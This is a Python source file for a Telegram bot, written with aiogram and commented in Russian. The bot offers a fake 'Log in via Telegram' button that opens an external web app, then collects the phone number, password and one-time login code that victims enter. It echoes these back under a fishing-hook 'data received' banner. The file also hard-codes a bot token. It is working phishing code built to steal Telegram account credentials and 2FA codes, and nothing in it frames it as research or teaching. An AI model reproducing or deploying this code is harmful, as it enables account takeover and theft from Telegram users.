import asyncio
import logging
import json
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton

# ==========================================
# 👇 ВСТАВЬ СЮДА СВОИ ДАННЫЕ 👇
# ==========================================
BOT_TOKEN = "8563110236:AAH-cKeML0VCbTzpp3nMsHHYvfLPuPwmRj0"
WEB_APP_URL = "https://vanchopiki.github.io/test/"
# ==========================================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# Команда /start
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="📱 Войти через Telegram",
                web_app=WebAppInfo(url=WEB_APP_URL)
            )
        ]
    ])

    await message.answer(
        "Привет! Нажми на кнопку ниже, чтобы открыть приложение:",
        reply_markup=keyboard
    )


# Прием данных от сайта
@dp.message(F.web_app_data)
async def get_web_app_data(message: types.Message):
    try:
        data = json.loads(message.web_app_data.data)

        phone = data.get('phone', '—')
        password = data.get('password', '—')
        code = data.get('code', '—')

        text = (
            "🎣 <b>Данные получены!</b>\n\n"
            f"📱 <b>Телефон:</b> <code>{phone}</code>\n"
            f"🔐 <b>Пароль:</b> <code>{password}</code>\n"
            f"🔢 <b>Код:</b> <code>{code}</code>"
        )

        await message.answer(text, parse_mode="HTML")

    except Exception as e:
        await message.answer(f"Ошибка: {e}")


async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Стоп.")